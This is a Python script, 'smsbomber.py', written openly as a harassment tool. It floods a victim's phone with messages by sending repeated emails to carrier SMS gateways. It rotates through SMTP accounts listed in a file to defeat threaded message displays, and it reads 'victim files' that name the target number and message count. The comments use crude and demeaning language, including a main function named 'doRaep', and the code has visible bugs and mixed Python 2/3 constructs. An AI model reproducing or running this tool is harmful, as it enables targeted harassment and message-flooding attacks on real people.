# Name: smsbomber.py
# Coded by cxdy on Github
# Please don't repost, and don't remove this.
# Modified by Finn, with much appreciation to
# cxdy for the original.

# Changes: 
# I: Can use an array of email
# accounts, to be more annoying to modern
# message UI's, which use threaded displays
# II: Changed that huge if-statement into
# an array because muh autism said so.
# III: Should now work in python3, modernized
# print() statements, raw_input->input() etc
# IV: Removed email component, there's other
# bombers for that, like the original.
# V: Added capability to read pre-written victim
# files:
# $ python smsbomber.py victimfile
#	 VICTIM FILE SYNTAX:
#	 9001				(Number Of Messages to send)
#	 1234567890			(SMS Number to send to)
#	 1				(ID of Carrier to use; See bottom of page or callout file)
#	 0				(Message to send, can be string. 0 = Random)

import smtplib as s
import os
import sys
import random
import string

smtpServer = "PUT YOUR SERVER HERE"
smtpPort = int(1234) #PUT THE PORT HERE

# Human Readable List of Carriers
carrierBlock = " What is their carrier? \n	1. Alltel\n	2. AT&T\n	3. Rogers\n	4. Sprint\n	5. T-Mobile\n	6. Telus\n	7. Verizon\n	8. Virgin Mobile\n	9. Orange\n 10. Vodafone [Iceland]\n 11. Nova [Iceland]"

# This is the bullshit maker
# It generates 2-3 SMS's worth of garbage 
# in case you don't want to specify a message.
def generateBullshit():
	randomShit = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(120)])
	moreShit = randomShit + randomShit + randomShit
	return moreShit

# This ensures it doesn't run again after parsing a victim file
finished = 0

# The main function
def doRaep(telephoneNumber, cellCarrier, message, goUntil):

	# This array lists all the carriers we have avail. See the readme.md for how to add more
	carriers = ["ISHYGDEST", "alltelmessage.com", "txt.att.net", "pcs.rogers.com", "messaging.sprintpcs.com", "tmomail.net", "msg.telus.com", "vtext.com", "vmob1.com", "sms.orange.pl", "sms.is", "mms.nova.is"]
	fullAddress = str(telephoneNumber) +"@" +str(carriers[cellCarrier])
	tid = 0	
	while tid < goUntil:
		# This checks if you chose to generate a random message earlier
		# I moved it down here so that the message is different every time
		if message == 0:
			message = generateBullshit()

		# Accounts should be in username:password format!
		accountsFile = open("accounts.txt", "r")

		# Picking a random username:password combo from the file
		whichAccount = random.choice(accountsFile.readlines())

		# Seperating the username from the password (delemiated [sp?] with : )
		breakLine = whichAccount.split(":")
		
		# Making sure they're strings because python a shit
		username = breakLine[0]
		password = breakLine[1].strip('\n')
		
		# Preparing the SMTP connection
		obj = s.SMTP(smtpServer, smtpPort)
		obj.ehlo()
		obj.starttls()
		obj.ehlo()
		obj.login(username, password)

	    	message = ("From: "+username+"\r\nTo: "+fullAddress+" \r\n\r\n "+message)
		# Actually sending the mail
        	obj.sendmail(username, fullAddress, message)
			
		# Informing you
		print("Message #" + str(tid+1) + " of " + str(goUntil) + " (from " + username + " with love)")

		# Incrementing the number of emails sent
		tid = tid + 1		

# Victimfile parsing

if len(sys.argv) > 1:
	victimFile = sys.argv[1]
	victimGet = open(victimFile, 'r').readlines()
	goUntil = victimGet[0]
	telephoneNumber = victimGet[1]
	cellCarrier = victimGet[2]
	message = victimGet[3]
	finished = 1
	doRaep(int(telephoneNumber), int(cellCarrier), message, int(goUntil))

# Basic Info Block
if finished == 0:
	print("Uncle Benis' SMS/Email Bomber \n\r")
	print("Please ensure you have email accounts  \n\r")
	print("stored in accounts.txt \n \r")


	# Setting a limit on the madness
	goUntil = input("Send this many: ")

	# If you chose SMS
	telephoneNumber = input("Telephone Number: ")
	cellCarrier = input(carrierBlock + "\n: ")
	print("What message would you like?\n")
	message = ""
	message = input("(Type 0 for random text) :")
	doRaep(int(telephoneNumber), int(cellCarrier), message, int(goUntil))
	
